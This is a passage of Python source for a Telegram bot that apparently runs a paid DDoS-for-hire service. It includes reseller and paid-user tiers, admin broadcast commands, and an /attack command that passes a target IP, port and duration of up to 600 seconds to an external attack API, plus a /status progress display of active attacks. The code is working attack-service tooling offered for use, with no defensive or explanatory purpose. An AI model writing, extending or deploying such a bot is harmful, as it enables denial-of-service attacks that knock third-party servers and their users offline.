    text = f"📢 <b>𝗕𝗥𝗢𝗔𝗗𝗖𝗔𝗦𝗧 𝗠𝗘𝗦𝗦𝗔𝗚𝗘</b>\n━━━━━━━━━━━━━━━━━━━━━━\n\n{parts[1]}\n\n━━━━━━━━━━━━━━━━━━━━━━"
    success, fail = 0, 0
    
    for target in target_list:
        try:
            bot.send_message(target, text, parse_mode="HTML")
            success += 1
            time.sleep(0.1) 
        except Exception:
            fail += 1

    bot.reply_to(sender_message, f"📢 <b>{prefix_msg} Done</b>\n✅ Sent: {success}\n❌ Failed: {fail}", parse_mode="HTML")

@bot.message_handler(commands=['broadcast'])
def broadcast_all(message):
    user_id = str(message.chat.id)
    if not is_admin(user_id): return bot.reply_to(message, admin_only_msg(), parse_mode="HTML")
    all_targets = list(all_known_users | set(allowed_user_ids) | RESELLER_IDS | ADMIN_IDS)
    execute_broadcast(message, all_targets, "Broadcast to ALL USERS")

@bot.message_handler(commands=['bcpaid'])
def broadcast_paid(message):
    user_id = str(message.chat.id)
    if not is_admin(user_id): return bot.reply_to(message, admin_only_msg(), parse_mode="HTML")
    execute_broadcast(message, allowed_user_ids, "Broadcast to PAID USERS")

@bot.message_handler(commands=['bcreseller'])
def broadcast_reseller(message):
    user_id = str(message.chat.id)
    if not is_admin(user_id): return bot.reply_to(message, admin_only_msg(), parse_mode="HTML")
    execute_broadcast(message, list(RESELLER_IDS), "Broadcast to RESELLERS")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  API ATTACK SYSTEM WITH LIVE STATUS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def clean_up_attack(user_id):
    if user_id in active_attacks:
        del active_attacks[user_id]

def run_attack_api(chat_id, user_id, target, port, time_val):
    api_url = ATTACK_API_URL.format(ip=target, port=port, time=time_val)
    
    try:
        response = requests.get(api_url, timeout=10)
        if response.status_code == 200:
            time.sleep(time_val)
            bot.send_message(chat_id, f"🚀 <b>𝗔𝘁𝘁𝗮𝗰𝗸 𝗙𝗶𝗻𝗶𝘀𝗵𝗲𝗱!</b> 🚀\n\n🎯 <b>Target:</b> <code>{target}:{port}</code>\n⏱️ <b>Duration:</b> {time_val}s", parse_mode="HTML")
        else:
            bot.send_message(chat_id, f"⚠️ <b>API Error:</b> Server returned status {response.status_code}", parse_mode="HTML")
    except requests.exceptions.RequestException:
        bot.send_message(chat_id, f"❌ <b>Connection Failed:</b> Could not reach the attack API.", parse_mode="HTML")
    finally:
        clean_up_attack(user_id)


@bot.message_handler(commands=['attack'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    
    if user_id not in allowed_user_ids:
        return bot.reply_to(message, no_access_msg(), parse_mode="HTML")

    if not is_admin(user_id):
        if user_id in bgmi_cooldown:
            time_passed = (datetime.datetime.now() - bgmi_cooldown[user_id]).total_seconds()
            if time_passed < 60:
                return bot.reply_to(message, f"⏳ <b>Cooldown!</b> Wait {int(60 - time_passed)}s.", parse_mode="HTML")

    command = message.text.split()
    if len(command) == 4:
        target = command[1]
        try:
            port = int(command[2])
            time_val = int(command[3])
        except ValueError:
            return bot.reply_to(message, "❌ Port and Time must be valid numbers.", parse_mode="HTML")

        if time_val > 600:
            return bot.reply_to(message, "❌ Max time is 600s.", parse_mode="HTML")

        bgmi_cooldown[user_id] = datetime.datetime.now()
        
        active_attacks[user_id] = {
            "target": f"{target}:{port}",
            "start_time": time.time(),
            "duration": time_val
        }
        
        log_action(user_id, f"Attack → IP: {target} | Port: {port} | Time: {time_val}s", message)
        
        attack_msg = (
            f"⚡ <b>𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝘁𝗮𝗿𝘁!</b> ⚡\n\n"
            f"🎯 <b>Target:</b> <code>{target}:{port}</code>\n"
            f"⏱️ <b>Time:</b> {time_val}s\n"
            f"⏳ <b>Cooldown:</b> 60s\n\n"
            f"📊 <i>Check progress with /status</i>"
        )
        bot.reply_to(message, attack_msg, parse_mode="HTML")
        
        threading.Thread(target=run_attack_api, args=(message.chat.id, user_id, target, port, time_val)).start()

    else:
        bot.reply_to(message, "✅ <b>Usage:</b> <code>/attack [ip] [port] [time]</code>", parse_mode="HTML")


@bot.message_handler(commands=['status'])
def attack_status(message):
    total_active = len(active_attacks)
    
    status_msg = (
        "╔══════════════════════════╗\n"
        "║  🔥 <b>𝗔𝗧𝗧𝗔𝗖𝗞 𝗦𝗧𝗔𝗧𝗨𝗦</b> 🔥        ║\n"
        "╠══════════════════════════╣\n"
        f"║  📊 Total Active: {total_active}               ║\n"
        "╚══════════════════════════╝\n\n"
    )

    if total_active == 0:
        status_msg += "<i>No active attacks right now.</i>"
    else:
        current_time = time.time()
        for uid, attack in active_attacks.items():
            elapsed = current_time - attack["start_time"]
            remaining = int(attack["duration"] - elapsed)
            
            if remaining <= 0:
                remaining = 0
                percent = 100
            else:
                percent = int((elapsed / attack["duration"]) * 100)
            
            filled_circles = int(percent / 10)
            empty_circles = 10 - filled_circles
            progress_bar = ("🟢" * filled_circles) + ("⚫" * empty_circles)

            status_msg += (
                f"┌─────────────────────────┐\n"
                f"│ 🎯 <code>{attack['target']}</code>\n"
                f"│ ⏱️ {remaining}s remaining\n"
                f"│ {progress_bar} {percent}%\n"
                f"└─────────────────────────┘\n"
            )
            
    status_msg += "\n⚙️ <b>Max Time:</b> 600s"
    bot.reply_to(message, status_msg, parse_mode="HTML")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  ENTRY POINT
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

if __name__ == "__main__":
    remove_expired_users()
    print("━━━━━━━━━━━━━━━━━━━━━━")
    print("   ✅ Bot is running with Premium UI")
    print("━━━━━━━━━━━━━━━━━━━━━━")
    bot.infinity_polling(timeout=30, long_polling_timeout=20)
